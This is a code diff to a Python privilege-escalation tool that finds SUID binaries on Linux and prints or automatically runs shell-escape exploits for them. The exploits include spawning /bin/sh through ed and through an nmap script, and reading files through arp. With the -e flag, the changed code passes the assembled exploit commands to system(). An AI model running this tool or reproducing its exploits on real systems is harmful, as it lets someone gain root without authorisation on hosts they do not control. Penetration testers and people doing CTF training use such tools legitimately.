@@ -7,13 +7,14 @@ Works with both python2 & python3
 from sys import argv
 from os import system, popen
 from time import sleep
+import json
 
 
 """
 The following list contains exploits for all known SUID binaries
 """
 
-myDict={
+customSUIDs = {
 	'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"',
 	'ed': './ed\n!/bin/sh',
 	'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
@@ -165,7 +166,7 @@ def listAllSUIDBinaries():
 	print(white + "[" + blue + "#" + white + "] " + yellow + "Finding/Listing all SUID Binaries ..")
 	print(white + barLine)
 	
-	command 	= "find / -perm -4000 2>/dev/null"
+	command 	= "find / -perm -4000 2>/dev/null" # Since /4000 isn't backwards compatible with old versions of find ..  :)) 
 	result 		= popen(command).read().strip().split("\n")
 	
 	for bins in result:
@@ -230,16 +231,35 @@ def doSomethingPlis(listOfSuidBins):
 		print("[" + red + "!" + white + "] " + magenta + "None " + red + ":(")
 		print(white + barLine + "\n\n")
 
-	print("[" + green + "#" + white + "] " + green + "Exploit")
-	print(white + barLine)
 
+	"""
+	PR by @th3instein
+	@modded
+	"""
+	binsToExploit 	= []
+	_binsToExploit 	= {}
 	for binary in binsInGTFO:
-		bName = binary[::-1].split("/")[0][::-1]
-		if(bName not in suidExploitation):
-			exploitation 	= myDict[bName]
-			print(white + "[" + cyan + "&" + white + "] " + magenta + bName.capitalize() + white + "\n```\n" + blue + exploitation.replace('./' + bName, binary) + white + "\n```\n")
-	
-	print(white + barLine+"\n\n")
+		binaryName 	= binary[::-1].split("/")[0][::-1]
+
+		if binaryName not in suidExploitation:
+			_binsToExploit[binary] = customSUIDs[binaryName]
+
+
+	if len(_binsToExploit) != 0:
+		print("[" + yellow + "&" + white + "] " + cyan + "Manual Exploitation (Binaries which create files on the system)")
+		print(white + barLine)
+
+		for binaryPath, binaryExploitation in _binsToExploit.items():
+			binaryName 			= binaryPath[::-1].split("/")[0][::-1]
+			binaryExploitation 	= binaryExploitation.replace('./' + binaryName, binaryPath)
+
+			print(white + "[" + cyan + "&" + white + "] " + magenta + binaryName.capitalize() + white + " ( " + green + binaryPath + " )" + white)
+			print(yellow + binaryExploitation + white + "\n")
+
+		print(white + barLine + "\n\n")
+	"""
+	@PR End
+	"""
 	return(binsInGTFO, defaultSuidBins, customSuidBins)
 
 
@@ -259,26 +279,27 @@ def exploitThisShit(bins):
 			_results 	= suidBins + " " + suidExploitation[_bin]
 			commands.append(_results)
 
-	if len(argv) == 2:
-		if argv[1] == '-e':
-			print(white + "[" + magenta + "$" + white + "] " + white + "Auto Exploiting SUID bit binaries !!!")
+	if len(commands) != 0:
+		if len(argv) == 2:
+			if argv[1] == '-e':
+				print(white + "[" + magenta + "$" + white + "] " + white + "Auto Exploiting SUID bit binaries !!!")
+				print(white + barLine)
+
+				for _commands in commands:
+					print(magenta + "\n[#] Executing Command .. ")
+					print(cyan + "[~] " + _commands + "\n" + white)
+					sleep(0.5)
+					system(_commands)
+					sleep(0.5)
+
+				print(white + barLine + "\n\n")
+
+		else:
+			print(white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit SUID bin(s) found !!!")
 			print(white + barLine)
 
 			for _commands in commands:
-				print(magenta + "\n[#] Executing Command .. ")
-				print(cyan + "[~] " + _commands + "\n" + white)
-				sleep(0.5)
-				system(_commands)
-				sleep(0.5)
-
-			print(white + barLine + "\n\n")
-
-	else:
-		print(white + "[" + green + "$" + white + "] " + white + "Please try the command(s) below to exploit SUID bin(s) found !!!")
-		print(white + barLine)
-
-		for _commands in commands:
-			print("[~] " + _commands)
+				print("[~] " + _commands)
 
 		print(white + barLine + "\n\n")	
 
